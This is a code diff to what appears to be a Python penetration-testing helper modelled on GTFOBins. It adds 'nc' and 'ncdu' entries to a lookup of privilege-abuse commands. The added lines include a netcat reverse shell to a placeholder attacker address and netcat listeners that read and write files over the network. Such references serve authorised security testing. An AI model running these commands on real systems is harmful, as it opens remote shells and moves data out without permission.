@@ -2552,6 +2552,30 @@ def gtfo_bins(gtfo_command, gtfo_options):
         elif gtfo_options == "suid":
             bins.append("N/A")
 
+    elif gtfo_command == "nc":
+        if gtfo_options == "shell":
+            bins.append("nc -e /bin/sh YOUR_IP YOUR_PORT #")
+        elif gtfo_options == "file-write":
+            bins.append("nc -l -p 12345 </path/to/input-file")
+        elif gtfo_options == "file-read":
+            bins.append("nc -l -p 12345 >/path/to/output-file")
+        elif gtfo_options == "suid":
+            bins.append("N/A")
+        elif gtfo_options == "sudo":
+            bins.append("N/A")
+    
+    elif gtfo_command == "ncdu":
+        if gtfo_options == "shell":
+            bins.append("ncdu\nb")
+        elif gtfo_options == "sudo":
+            bins.append("N/A")
+        elif gtfo_options == "suid":
+            bins.append("N/A")
+        elif gtfo_options == "file-read":
+            bins.append("N/A")
+        elif gtfo_options == "file-write":
+            bins.append("N/A")
+
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
         if gtfo_options == "shell": #This will print out hints for more GTFO bins!
@@ -2594,7 +2618,8 @@ def main():
         "ltrace", "lp", "lua", "lualatex", "luatex", "lwp-download", "lwp-request",
         "mail", "make", "man", "mawk", "minicom", "more", "mosquitto", "mount",
         "msfconsole", "msgattrib", "msgcat", "msgconv", "msgfilter", "msgmerge",
-        "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk", "other",
+        "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk",
+        "nc", "ncdu", "other",
     }
 
     if start in ALLOWED:
